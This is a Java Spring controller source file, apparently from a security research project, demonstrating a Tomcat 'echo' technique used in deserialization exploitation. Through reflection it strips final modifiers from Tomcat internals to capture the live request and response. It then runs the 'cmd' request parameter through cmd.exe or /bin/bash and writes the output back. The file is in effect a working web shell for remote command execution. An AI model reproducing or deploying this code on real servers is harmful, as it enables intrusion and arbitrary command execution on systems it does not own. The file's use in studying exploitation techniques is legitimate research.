package com.firebasky.echo.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


/**
 * shiro反序列化漏洞的利用中是不能成功
 */
@RestController
public class Tomcat {
    @RequestMapping("/tomcat")
    public String Tomcat() {
        try{
            //获取各字段
            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField("lastServicedRequest");
            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField("lastServicedResponse");

            //去掉final修饰符
            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

            //设置允许访问
            WRAP_SAME_OBJECT.setAccessible(true);
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);

            //如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果
            if(!WRAP_SAME_OBJECT.getBoolean(null)){
                WRAP_SAME_OBJECT.setBoolean(null,true);
                lastServicedRequest.set(null,new ThreadLocal());
                lastServicedResponse.set(null,new ThreadLocal());
            }else{
                ThreadLocal<javax.servlet.ServletRequest> threadLocalRequest = (ThreadLocal<javax.servlet.ServletRequest>) lastServicedRequest.get(null);
                ThreadLocal<javax.servlet.ServletResponse> threadLocalResponse = (ThreadLocal<javax.servlet.ServletResponse>) lastServicedResponse.get(null);
                javax.servlet.ServletRequest request = threadLocalRequest.get();
                javax.servlet.ServletResponse response = threadLocalResponse.get();

                String cmd=request.getParameter("cmd");

                if(cmd!=null){
                    String[] cmds=null;

                    if(System.getProperty("os.name").toLowerCase().contains("win")){
                        cmds=new String[]{"cmd.exe", "/c", cmd};
                    }else{
                        cmds=new String[]{"/bin/bash", "-c", cmd};
                    }

                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";

                    java.io.Writer writer = response.getWriter();
                    //目前得到的response是org.apache.catalina.connector.ResponseFacade，其封装了org.apache.catalina.connector.Response，要修改的usingWriter字段在后者中
                    java.lang.reflect.Field r=response.getClass().getDeclaredField("response");
                    r.setAccessible(true);
                    java.lang.reflect.Field usingWriter = Class.forName("org.apache.catalina.connector.Response").getDeclaredField("usingWriter");
                    usingWriter.setAccessible(true);
                    usingWriter.set(r.get(response), Boolean.FALSE);
                    //解决报错。。
                    writer.write(output);
                    writer.flush();
                    writer.close();
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
        return "test";
    }
}